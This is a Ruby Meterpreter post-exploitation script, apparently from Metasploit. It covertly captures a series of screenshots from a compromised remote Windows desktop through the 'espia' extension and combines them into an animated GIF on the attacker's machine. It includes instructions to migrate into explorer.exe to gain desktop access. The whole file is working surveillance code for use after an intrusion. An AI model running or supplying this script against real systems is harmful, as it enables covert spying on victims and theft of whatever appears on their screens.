# Thie script will create an animated gif of activity on a remote machine
# You are required to be migrated to a process which has access to the desktop
# Provided by Ryan Linn <sussurro@happypacket.net>


require 'fileutils'
begin
	require 'RMagick'
rescue ::LoadError
	print_status("RMagick library not found, it must be installed to use this script")
	raise Rex::Script::Completed
end

opts = Rex::Parser::Arguments.new(
        "-h" => [ false, "Help menu." ],
        "-t" => [ true, "The frequency in seconds to take a screenshot" ],
        "-f" => [ true, "The name of the file to create" ],
        "-c" => [ true, "The number of frames to take before creation" ]
)

freq = 10
count = 5
file = "screenshot.gif"
opts.parse(args) { |opt, idx, val|
        case opt
        when '-t'
                freq = val.to_i
        when '-f'
                file = val
        when '-c'
                count = val.to_i
        when "-h"
                print_line "Screenshot -- Create a animated gif of screen activity"
                print_line
                print_line "WARNING: You must be migrated to a process such as explorer.exe which has access to the desktop"
                print_line "This script captures one frame every few seconds"
                print_line "and then combines them into an animated gif."
                print_line "You can find the file you wish to create in "
                print_line "stored in #{Msf::Config.install_root}"
                print_line(opts.usage)
                raise Rex::Script::Completed
        end
}

if(file !~ /gif$/)
	print_status("Outfile must be a gif to achieve animation, try again")
	raise Rex::Script::Completed
end

# The 'client' object holds the Meterpreter session
# Aliasing here for plugin compatibility
session = client

# Extract the host and port
host,port = session.tunnel_peer.split(':')

print_status("New session on #{host}:#{port}...")

# Create a directory for the logs
logs = ::File.join(Msf::Config.config_directory, 'logs', 'screenshot', host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000)) )

# Create full path to output file
outfile = ::File.join(logs,file)

# Create the log directory
::FileUtils.mkdir_p(logs)


begin
	session.core.use("espia")

	begin
		(1..count).each do |i|	
			sleep(freq) if(i != 1)
			path = File.join(logs,"screenshot#{i}.bmp")
			print_status("Capturing screenshot #{i}")
                	data = session.espia.espia_image_get_dev_screen
	
               		if(data)
                       		::File.open(path, 'wb') do |fd|
                              		fd.write(data)
					fd.close()
				end
                	end
		end
	rescue ::Exception => e
		print_status("Screenshot Failed: #{e.class} #{e} #{e.backtrace}")
	end
	
	print_status("Screenshot finished on #{host}:#{port}...")
	print_status("Building image file #{outfile}... this may take a while")
	begin
		imagelist = Magick::ImageList.new()

		print_status("Reading screenshots...")
		(1..count).each do |i|
			filename = File.join(logs,"screenshot#{i}.bmp")
        		imagelist.read(filename)
		end
		imagelist.ticks_per_second=1
		imagelist.delay=freq
		imagelist.iterations=1
		print_status("Writing output file #{outfile}")
		imagelist.write(outfile)
	rescue ::Exception => e
		print_status("Animation failed: #{e.class} #{e} #{e.backtrace}")
	end
	print_status("Screenshot animation created at #{outfile}")

	
rescue ::Exception => e
	print_status("Exception: #{e.class} #{e} #{e.backtrace}")
end
